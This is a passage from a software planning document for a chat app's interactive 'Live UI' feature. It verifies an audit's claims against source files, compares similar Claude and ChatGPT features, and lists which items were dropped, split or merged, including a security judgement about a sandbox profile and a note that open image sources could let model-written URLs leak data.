| Document view shares one storage key | Confirmed | `document-view.tsx:148` |
| Header has only Reset; reply copy includes JSON | Confirmed | `live-ui-block.tsx:84-106`, `message-item.tsx:971` |
| No server check, repair, telemetry or eval | Confirmed | No Live UI code under `src/lib/chat/turn/`; `bench/` holds only `workflows/` |
| Needs a `live_ui_replace` frame and a `live_ui_repair` feature | **Wrong** | The `done` frame already replaces content (`use-chat.ts:792-811`, `NativeChatAPIClient.swift:1710-1722`); repair runs before saving |
| `bench/live-ui/` | **Corrected** | Repo pattern is `scripts/eval-*.ts` + `src/lib/eval/*-cases.ts` |
| Web placeholder for unknown types | **Wrong for web** | Web ships with the server; only native needs it |
| Full-history digest saves 70% "with a stable prefix" | **Wrong as written** | Rewriting an old message breaks the cache from there (`anthropic-cache.ts:49-70`); bounded in LU-08 |
| `where(list, 'expr')` | **Changed** | Nested expression strings; replaced with field and value forms |
| Live HTML on the `private` profile with a free `send` | **Unsafe** | `sandbox-policy.ts:142-146,184-188`; needs an `inline` profile and a host-confirmed send |
| A `visual_style` memory tag is needed | **Unnecessary** | Memory notes already reach the tail (`turn-context-tail.ts:53-75`) |
| Server geocoding for maps | **No provider exists** | Native MapKit on device instead (LU-14) |
| Card images only via a proxy | Confirmed and **strengthened** | CSP `img-src https:` (`csp.ts:74`) makes model-written URLs an exfiltration path |
| Claude: HTML, copy as image, download .svg/.html, save as artifact, full screen, click sends a follow-up, ephemeral, not on iOS/Android, remembers style, logged-in shares | Confirmed | support.claude.com/en/articles/13979539 (fetched, 22 Apr 2026) |
| ChatGPT Intelligent UI: charts, forms, buttons; checklists keep state on refresh, not across threads; Personalization > Layout and Visuals > Simple; web and updated apps; not Voice or Work | Plausible, not fetched | Help-centre article 20001598 (search excerpts in several locales); TechRepublic, Android Authority, YourStory (7–8 Oct 2026). `help.openai.com` is DNS-blocked here. |
| ChatGPT has no export | Low confidence | A single third-party review excerpt; not used to justify any item |

---

## 3. Dropped or merged

- **Dropped: "share with my adjusted values".** Low value, and it collides with the share-with-specific-people migration on `Share`.
- **Dropped: the new SSE frame `live_ui_replace` and the client feature `live_ui_repair`.** Unnecessary, because the `done` frame already carries the saved message.
- **Dropped: a web placeholder for unknown component types.** Wrong on the web; kept native-only, in LU-05.
- **Dropped: a "validated multi-field form submit" (audit table row 12).** A button prompt with `{{input}}` interpolation already submits several fields (`spec.ts:887-893`, `interpolate`), and no item in the audit specified more.
- **Dropped: the `visual_style` memory tag.** The memory pipeline already carries the preference; only the `accent` field remains, in LU-10.
- **Dropped: the iOS 3-second undo toast.** Neither web nor Mac has one; iOS just matches them.
- **Deferred: web maps.** They need a tile and geocoder vendor plus a privacy decision; native MapKit ships in LU-14.
- **Split:**
  - The audit's LUI-3 became LU-03 (local state plus model visibility, no server table) and LU-09 (cross-device sync).
  - LUI-5 became LU-02 (charts) and LU-07 (tables and filter functions).
  - LUI-8 became LU-11 (SVG figure), LU-14 (native maps) and LU-15 (sourced photos).
- **Merged:** the audit's quick-win list is folded into LU-02, LU-03, LU-04 and LU-05, so that no quick win ships without a test.
